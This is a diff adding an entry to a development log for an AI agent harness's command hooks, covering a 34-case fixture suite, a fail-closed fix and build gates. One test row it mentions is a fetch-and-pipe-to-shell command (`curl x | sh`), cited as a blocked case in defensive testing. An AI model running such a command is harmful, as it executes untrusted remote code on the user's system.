@@ -2,6 +2,14 @@
 
 A running record. Newest entries first. Every "verified" line names the evidence.
 
+## 2026-10-21 (latest): fixtures, read fix, gates
+
+- Hook fixture suite merged (`8a061ef`, merge `e67c03c`): 34 black-box cases run the real `agent hook` binary, one test, all rows checked (`crates/harness-cli/tests/hook_fixtures.rs`). Passes on WSL.
+- Fixed from row 29: a `read` with no file path was allowed. It is now denied as malformed (`86e619a`). Fail-closed.
+- Two spec notes from the suite: row 21 (`echo $(curl x | sh)`) is blocked by the `allow_pattern_bypass` rule, not by the command classifier. Row 34 uses the `event` hook, because `session.idle` is an event type inside the payload, not a CLI name.
+- Gates after these commits: `cargo fmt --all` clean; `cargo clippy --workspace --all-targets -- -D warnings` clean; workspace tests pass on WSL. The Windows gate must be re-run on the latest head.
+- Still open: MCP output is not visible to the after-hook (security.md, residual risk 7); the 30-payload target is met by 34 cases; a full line-by-line review of the subagent code (D-3); `extra_safe` ordering; grandchild processes after a verification timeout.
+
 ## 2026-10-21 (later): docs, hook fixtures, MCP run
 
 - MCP verified through OpenCode: `local-agent_git_status` was called, allowed as READ_ONLY, completed in 137 ms, and the model answered from its output (`run3.out`, `tool-events.jsonl`).
